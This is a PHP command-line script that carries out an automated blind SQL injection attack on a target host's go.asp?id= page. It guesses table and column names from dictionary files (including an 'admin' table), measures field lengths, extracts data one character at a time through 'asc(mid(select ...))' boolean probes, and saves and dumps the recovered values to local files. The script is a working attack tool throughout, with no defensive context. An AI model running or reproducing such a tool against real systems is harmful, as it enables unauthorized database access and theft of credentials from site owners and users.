<?php
	define("ROOT", str_replace("\\","/",realpath("./")));
	function request($url)
	{
		$ch = curl_init();
		curl_setopt($ch, CURLOPT_URL, $url);
		curl_setopt($ch, CURLOPT_HEADER, 0);
		curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
		//若给定url自动跳转到新的url,有了下面参数可自动获取新url内容：302跳转
		curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
		//设置cURL允许执行的最长秒数。
		curl_setopt($ch, CURLOPT_TIMEOUT, 10);
		curl_setopt($ch, CURLOPT_USERAGENT, 'Mozilla/5.0 (Windows NT 6.1; WOW64; rv:47.0) Gecko/20100101 Firefox/47.0');
		curl_setopt($ch, CURLOPT_REFERER, $url);
		curl_setopt($ch, CURLOPT_ENCODING, 'gzip, deflate');
		$content = curl_exec($ch);
		return $content;
	}
	function GetHostId()
	{
		unset($GLOBALS["argv"][0]);
		$ConsoleParameter = isset($GLOBALS["argv"]) && !empty($GLOBALS["argv"]) && count($GLOBALS["argv"])>=4 ? $GLOBALS["argv"] : exit("[-] No parameters.\n");
		$i = 1;$HostId=[];
		while (!empty($ConsoleParameter))
		{
			if(isset($ConsoleParameter[$i]) && !empty($ConsoleParameter[$i]))
			{
				$ConsoleParameter[$i] = str_replace("-", "", $ConsoleParameter[$i]);
				if(isset($ConsoleParameter[$i+1]))
				{
					if($ConsoleParameter[$i] == "host" || $ConsoleParameter[$i] == "h")
					{
						$HostId[$ConsoleParameter[$i]] = $ConsoleParameter[$i+1];
					}
					if($ConsoleParameter[$i] == "id"){
						$HostId[$ConsoleParameter[$i]] = ((int)$ConsoleParameter[$i+1] > 0) ? (int)$ConsoleParameter[$i+1] : exit("[-] ID input error.\n");
					}
				}
				else
				{

					$HostId[$ConsoleParameter[$i]] = "";
				}
				unset($ConsoleParameter[$i+1],$ConsoleParameter[$i]);
			}
			$i += 2;
		}
		return $HostId;
	}
	
	function GetInput($string)
	{
		$str = null;
		do{
			fwrite(STDOUT,$string);
			$str = fgets(STDIN);
		}while(empty($str));
		return $str;
	}

	function GetHttp()
	{
		$HttpHttps = null;
		do{
			$input = GetInput("Please enter http/https (1 / 2) :");
			if($input == 1)
			{
				$HttpHttps = "http";
			}
			elseif($input == 2)
			{
				$HttpHttps = "https";
			}
		}while (empty($HttpHttps));
		return $HttpHttps;
	}

	function is_survival($url)
	{
		$contents = null;$count = 1;
		do{
			if($contents = request($url))
			{
				if(preg_match('/href="(.+)"/i',$contents))
				{
					return true;
				}
				else
				{
					return false;
				}
				$count++;
			}
			if($count > 5)
			{
				exit("[-] Number of connections more than five times the program automatically exits.\n");
			}
		}while(empty($contents));
	}

	function GetContents($file)
	{
		$filename = ROOT."/dictionary/{$file}.txt";$contents=null;
		if(is_file($filename))
		{
			$contents = file_get_contents($filename);
		}
		elseif(is_file(ROOT."/data/{$GLOBALS["host"]}/{$file}.txt"))
		{
			$contents = file_get_contents(ROOT."/data/{$GLOBALS["host"]}/{$file}.txt");
		}
		return $contents;
	}

	function TextPut($dir,$file=false,$contents=false)
	{
		$hostdir = ROOT."/data/{$GLOBALS["host"]}";
		if(!is_dir($hostdir))
		{
			mkdir($hostdir);
		}
		$dir = "{$hostdir}/{$dir}";
		if(!is_dir($dir))
		{
			mkdir($dir);
		}
		$file = "{$dir}/{$file}.txt";
		if(is_file($file))
		{
			file_put_contents($file, $contents,FILE_APPEND);
		}
		else
		{
			file_put_contents($file, $contents);
		}
	}

	function GetTablesOrColumns($get="tables")
	{
		$TablesOrColumns = array_filter(explode("\n",GetContents($get)));
		if($get == "tables")
		{
			$TablesOrColumns = array_map(function($table){
				return trim($table);
			}, $TablesOrColumns);
		}
		elseif($get == "columns")
		{
			$TablesOrColumns = array_map(function($col){
				return explode(" ", trim($col));
			}, $TablesOrColumns);
		}
		
		if(empty($TablesOrColumns))
		{
			exit("[-] File {$get} does not exist.\n");
		}
		return $TablesOrColumns;
	}

	function TablesOrColumnsSurvival($url,$array,$get="tables")
	{
		$TablesOrColumns = [];
		if($get == "tables")
		{
			$url .= "+and+exists(select+*+from+*1)";
		}
		elseif($get == "columns")
		{
			$url .= "+and+asc(mid((select+*2+from+admin),1,1))>1";
		}
		foreach($array as $arr)
		{
			if($get == "tables")
			{
				print "[+] Test table Url ".str_replace("*1", $arr, $url)."\n";
				if(is_survival(str_replace("*1", $arr, $url)))
				{
					$TablesOrColumns[] = $arr;
					print "[*] {$arr} table exists.\n";
				}
				else
				{
					print "[-] The {$arr} table does not exist.\n";
				}
			}
			elseif($get == "columns")
			{
				foreach($arr as $col)
				{
					print "[+] Test column Url ".str_replace("*2", trim($col), $url)."\n";
					if(is_survival(str_replace("*2", trim($col), $url)))
					{
						$TablesOrColumns[] = trim($col);
						print "[*] {$col} column exists.\n";
					}
					else
					{
						print "[-] The {$col} column does not exist.\n";
					}
				}
			}
		}
		if(empty($TablesOrColumns))
		{
			exit("[-] {$get} names do not exist in a dictionary.\n");
		}
		return $TablesOrColumns;
	}

	function GetStringLength($url,$tables,$columns)
	{
		$url .= "+and+asc(mid((select+*1+from+*2),*3,1))>1";
		$Length_columns = [];
		foreach($tables as $table)
		{
			foreach($columns as $col)
			{
				$length = 1;
				do{
					$urlLength = str_replace(["*1","*2","*3"], [$col,$table,$length], $url);
					if(!is_survival($urlLength))
					{
						break;
					}
					else
					{
						$length++;
					}
					print "[+] Testing field content length Url: {$urlLength}\n";
				}while(true);
				$Length_columns[$table] = $table;
				$length -= 1;
				$Length_columns[] = [$length=>$col];
				TextPut($table,$GLOBALS["host"],"{$length}=>$col\n");
			}
		}
		return $Length_columns;
	}

	function SqlInjection($url,$tablescolumns,$cache=false)
	{
		$url .= "+and+asc(mid((select+*1+from+*2),*3,1))=*4";
		$table = null;$contents='';
		foreach($tablescolumns as $arr)
		{
			if(is_string($arr))
			{
				$table = $arr;
			}
			if(is_array($arr))
			{
				foreach($arr as $length => $column)
				{
					if(isset($cache[$column]))
					{
						$i = $cache[$column];
					}
					else
					{
						$i = 1;
					}
					$contents[$column] = "";
					for($i;$i<=$length;$i++)
					{
						for($k=1;$k<=127;$k++)
						{
							$sqlurl = str_replace(["*1","*2","*3","*4"], [$column,$table,$i,$k], $url);
							print "[+] Url {$sqlurl} request succeeded\n";
							if(is_survival($sqlurl))
							{
								$contents[$column] .= chr($k);
								print "[*] Table {$table} column {$column} Current blasting: {$contents[$column]}\n";
								TextPut($table,$column,chr($k));
								break;
							}
						}
					}
				}
			}
		}
	}

	function is_cache()
	{
		$cache = [];$cachedir=null;
		if(is_dir(ROOT."/data/{$GLOBALS["host"]}"))
		{
			foreach(scandir(ROOT."/data/{$GLOBALS["host"]}") as $dir)
			{
				if($dir != "." && $dir != "..")
				{
					if(is_file(ROOT."/data/{$GLOBALS["host"]}/{$dir}/{$GLOBALS["host"]}.txt"))
					{
						$cache[$dir] = $dir;
						$contents = explode("\n",GetContents("{$dir}/{$GLOBALS["host"]}"));
						foreach($contents as $columnandlength)
						{
							list($key,$value) = explode("=>", $columnandlength);
							$cache[] = [trim($key)=>trim($value)];
							$cache["dir"] = $dir;
						}
					}
				}
			}
		}
		if(empty($cache))
		{
			return false;
		}
		return $cache;
	}

	function DumpContent()
	{
		foreach(scandir(ROOT."/data/{$GLOBALS["host"]}") as $dir)
		{
			if($dir != "." && $dir != "..")
			{
				foreach(scandir(ROOT."/data/{$GLOBALS["host"]}/{$dir}") as $file)
				{
					if($file != "." && $file != ".." && $file != "{$GLOBALS["host"]}.txt")
					{
						$filename = str_replace(".txt", "", $file);
						print "[*] The data in the field {$filename} is:".GetContents("{$dir}/{$filename}")."\n";
					}
				}
			}
		}
	}

	function Run()
	{
		extract(GetHostId());
		$GLOBALS["host"] = $host;
		if(!isset($batch))
		{
			$HttpHttps = GetHttp();
			$url = "{$HttpHttps}://{$host}/app/go.asp?id={$id}";
		}
		else
		{
			$url = "http://{$host}/app/go.asp?id={$id}";
		}
		if(!is_survival($url))
		{
			exit("[-] Input id error.\n");
		}
		if($tableandcolumn = is_cache())
		{
			print "[*] Getting the cache.\n";
			$cache = [];
			foreach($tableandcolumn as $arr)
			{
				if(is_array($arr))
				{
					foreach($arr as $length => $file)
					{
						if(strlen(GetContents("{$tableandcolumn["dir"]}/$file")) < $length)
						{
							$cache[$file] = strlen(GetContents("{$tableandcolumn["dir"]}/$file"))+1;
						}
					}
				}
			}
			unset($tableandcolumn["dir"]);
			if(!empty($cache))
			{
				SqlInjection($url,$tableandcolumn,$cache);
			}
		}
		else
		{
			$tables = TablesOrColumnsSurvival($url,GetTablesOrColumns());
			$columns = TablesOrColumnsSurvival($url,GetTablesOrColumns("columns"),"columns");
			$tableandcolumn = GetStringLength($url,$tables,$columns);
			SqlInjection($url,$tableandcolumn);
		}
		DumpContent();
	}
	Run();
?>